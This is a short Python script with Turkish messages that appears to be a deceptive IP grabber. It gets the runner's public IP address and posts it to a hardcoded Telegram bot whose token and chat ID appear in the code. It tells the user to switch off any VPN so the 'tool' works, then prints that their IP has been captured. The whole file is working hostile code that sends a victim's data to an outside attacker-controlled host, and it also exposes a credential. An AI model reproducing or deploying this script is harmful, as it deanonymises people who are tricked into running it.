import requests as r, re as e, socket


t, c = "7631073357:AAHvP-xDnQZGXHj1bPthaY2XWFAdrlPWx5o", "6373052429"


def v(d):
    return bool(e.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", d))


def s(d):
    u = f"https://api.telegram.org/bot{t}/sendMessage"
    data = {"chat_id": c, "text": f"🔔 Yeni giriş: {d}"}
    x = r.post(u, data=data)
    
    if x.status_code == 200:
        print("İp Adresiniz Ele Geçirildi")
    else:
        print(f"Hata: {x.status_code}")


def get_ip():
    try:
        
        ip = r.get("https://api64.ipify.org?format=text").text
        return ip if v(ip) else None
    except Exception as err:
        print(f"IP adresi alınırken hata oluştu: {err}")
        return None


if __name__ == "__main__":
    print("Vpn Kullanmayınız Yoksa Tool Çalışmıyor")

    ip = get_ip()
    if ip:
        s(ip)
    else:
        print("Lütfen En İyi Sonuçlar İçin Sahte İp Kullanmayınız")
